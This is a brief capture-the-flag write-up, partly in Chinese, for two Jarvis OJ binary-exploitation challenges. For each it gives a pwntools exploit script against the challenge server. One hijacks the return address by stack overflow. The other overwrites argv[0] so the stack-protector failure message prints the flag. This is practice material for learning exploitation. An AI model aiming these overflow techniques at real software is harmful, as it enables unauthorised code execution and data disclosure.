# write up 0710

## Tell Me Something

exp:

```python
from pwn import *

#n = process('./guestbook')
n = remote('pwn.jarvisoj.com', 9876)

n.recv()
payload = 'a' * 0x88 + p64(0x0400620)
n.sendline(payload)
n.interactive()
```



## Smash

搜了一下smash，发现是利用__stack_chk_fail函数打印argv[0]的内容，通过栈溢出到argv[0]来输出flag  

在程序的0x0600D20处有flag，可是在程序运行时0x600D21被覆盖了  

利用ELF文件重映射，如果ELF文件足够小，就会在不同区段进行映射  

进行调试之后发现在0x400D20处存在重映射后的flag，此处不会被覆盖  

exp:

```python
from pwn import *

#n = process('./smashes')
n = remote('pwn.jarvisoj.com', 9877)

n.recvuntil('name?')
payload = p64(0x400d20) * 200
n.sendline(payload)
n.recv()
n.sendline()
n.interactive()
```

